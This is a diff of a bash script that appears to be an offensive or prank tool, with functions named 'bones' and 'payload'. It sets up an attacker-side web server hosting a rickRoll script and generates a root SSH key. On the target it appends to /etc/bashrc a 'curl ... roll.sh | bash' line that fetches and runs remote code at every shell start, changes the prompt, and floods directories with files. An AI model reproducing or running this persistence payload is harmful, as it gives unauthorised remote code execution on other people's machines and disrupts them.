@@ -78,8 +78,13 @@ function bones() {
 	sshKey="/root/.ssh/id_rsa"
 	rickPath='./rickRoll/*'
 	rickScript='./rickRoll/roll.sh'
-	rickHost="$(hostname -I | tr -d ' '):80"
-	rickSourceIP="$(hostname -I | tr -d ' ')"
+	rickSourceIP="$(hostname -I | awk '{print $1}')"
+	### setting rickRoll IP ###
+		echo ""
+		read -p "What are we setting the rickRoll IP to [$rickSourceIP]: " rickSourceIP
+		: ${rickSourceIP:=$(hostname -I | awk '{print $1}')}
+		command sed -i "s/^rick=.*/rick=\"$rickSourceIP\"/" $rickScript
+	rickHost="$rickSourceIP:80"
 		#rickHost="$(hostname -I | tr -d ' '):8000"
 # stuff for making sure the http server is alive and ready
 	CHECK_rickServer="$(netstat -tulnap | grep -q "80.*apache"; echo $?)"
@@ -90,11 +95,6 @@ function bones() {
 		echo "$CHECK_rickFiles"
 	}
 #### Gathering Info ############################
-	### setting rickRoll IP ###
-		echo ""
-		read -p "What are we setting the rickRoll IP to [$rickSourceIP]: " rickSourceIP
-		: ${rickSourceIP:=$(hostname -I | tr -d ' ')}
-		command sed -i "s/^rick=.*/rick=\"$rickSourceIP\"/" $rickScript
 	### ssh key ###
 		if [ ! -e $sshKey ]; then
 			ssh-keygen -f $sshKey -t rsa -N ''
@@ -255,7 +255,7 @@ function payload(){			#
 											touch /tmp/.trigger
 											echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
 											echo '$centDirtyRootPS1' >> /etc/bashrc
-											echo 'curl -s -L '$rickHost'/roll.sh | bash' >> /etc/bashrc ;
+											echo 'curl -s -L $rickHost/roll.sh | bash' >> /etc/bashrc ;
 											yum install epel-release -y && yum --disablerepo=epel -y update ca-certificates && yum install aalib -y
 											touch hiThere_{0001..1000}
 											for n in {1..100}; do
